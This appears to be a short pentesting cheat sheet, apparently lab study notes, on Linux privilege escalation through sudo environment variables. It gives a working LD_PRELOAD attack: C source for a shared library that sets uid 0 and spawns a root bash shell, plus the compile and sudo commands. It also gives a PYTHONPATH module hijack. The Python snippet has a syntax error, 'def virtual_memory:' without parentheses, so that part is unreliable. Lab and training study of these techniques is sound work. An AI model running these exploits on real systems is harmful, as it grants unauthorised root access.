# Environment variables

> These exploits mostly rely on `env_reset` not being enabled. `env_reset` resets some environment variables. If this option isn't set, we can do library preload attack, by setting the `LD_PRELOAD` environment variable to our malicious library.
> `SETENV` or `env_keep` also works, but more limited
## `$LD_PRELOAD`

This user can run this command with root privilege. However, there is no `env_reset` option, or there is `env_keep+=LD_PRELOAD`

```sh
sudo -l
    (root) NOPASSWD: /usr/sbin/apache2 restart
```
### Compile exploit

We compile this library

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```sh
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

### Exploit

```sh
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

## `$PYTHONPATH`

### Example

We can run `python3` with `sudo`, but `SETENV` flag is on, which means we can set environment variable when running `python3`

```sh
sudo -l
	(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```

Write this module at `/tmp/psutil.py`

```python
import os

def virtual_memory:
	os.system('/bin/bash')
```

Run the script

```sh
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```